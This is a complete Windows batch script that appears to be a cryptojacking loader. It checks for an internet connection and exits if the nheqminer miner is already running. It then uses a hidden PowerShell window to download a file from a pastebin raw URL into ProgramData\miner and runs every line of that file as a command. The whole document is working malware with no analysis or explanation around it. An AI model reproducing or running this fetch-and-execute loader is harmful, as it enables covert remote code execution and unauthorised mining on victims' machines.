@echo off
Ping google.com -n 1 -w 1000
if errorlevel 1 exit
tasklist /FI "IMAGENAME eq nheqminer.exe" 2>NUL | find /I /N "nheqminer.exe">NUL && if "%ERRORLEVEL%"=="0" exit
powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile( 'https://pastebin.com/raw/HRRAnEgU', '%HOMEDRIVE%\ProgramData\miner\zminer.txt' )
timeout 5
for /F "eol=; tokens=1* delims=" %%i in ( %HOMEDRIVE%\ProgramData\miner\zminer.txt ) do call :run %%i 
:run
%*